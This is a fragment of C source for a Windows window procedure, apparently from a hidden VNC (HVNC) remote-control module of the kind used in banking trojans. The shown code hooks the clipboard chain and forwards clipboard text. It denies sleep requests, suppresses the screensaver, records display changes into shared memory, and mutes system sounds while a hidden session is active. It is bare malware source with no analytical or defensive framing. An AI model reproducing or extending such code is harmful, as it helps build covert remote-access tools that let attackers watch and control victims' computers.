LRESULT APIENTRY FakeVNCWndProc(HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam)
{
    switch (uMsg)
    {
        case WM_CREATE:
        {
            hNextViewer=SetClipboardViewer(hWnd);
            break;
        }
        case WM_DRAWCLIPBOARD:
        {
            if (OpenClipboard(hWnd))
            {
                bool bPresent=IsClipboardFormatAvailable(CF_TEXT);
                CloseClipboard();
                if (bPresent)
                    SendInputDesktopClipboard();
                SendMessage(hNextViewer,uMsg,wParam,lParam);
            }
            break;
        }
        case WM_CHANGECBCHAIN:
        {
            if (hNextViewer != (HWND)wParam)
                SendMessage(hNextViewer,WM_CHANGECBCHAIN,wParam,lParam);
            else
                hNextViewer=(HWND)lParam;
            break;
        }
        case WM_DISPLAYCHANGE:
        {
            lpSharedVNCData->dwNewWidth=LOWORD(lParam);
            lpSharedVNCData->dwNewHeight=HIWORD(lParam);
            if ((byte)wParam == 24)
                wParam=32;
            lpSharedVNCData->bNewBitsPerPixel=(byte)wParam;
            SetEvent(hDispChangeEvent);
            break;
        }
        case WM_ENDSESSION:
        {
            VNCCleanup(true);
            break;
        }
        case WM_POWERBROADCAST:
        {
            if (lParam & 1)
                return BROADCAST_QUERY_DENY;
            break;
        }
        case WM_SYSCOMMAND:
        {
            if (wParam == SC_SCREENSAVE)
                return -1;
            break;
        }
        case WM_DESTROY:
        {
            ChangeClipboardChain(hWnd,hNextViewer);
            break;
        }
        case WM_THEMECHANGED:
        {
            if (lpHandles)
            {
                EnterCriticalSection(&csHVNC);
                {
                    HVNC_HANDLE *lpHandle=lpHandles;
                    while (lpHandle)
                    {
                        if (lpHandle->lpServer)
                        {
                            PHVNC lpServer=lpHandle->lpServer;
                            if ((lpServer->bActive) && (!(lpServer->DeskInfo.dwFlags & HVNC_DONT_DISABLE_EFFECTS)))
                            {
                                if (lpServer->lpGlobalVNCData->dwExplorersPID)
                                {
                                    EnableSystemSounds(false);
                                    break;
                                }
                            }
                        }
                        lpHandle=lpHandle->lpNext;
                    }
                }
                LeaveCriticalSection(&csHVNC);
            }
            break;
        }
    }
    return 1;
}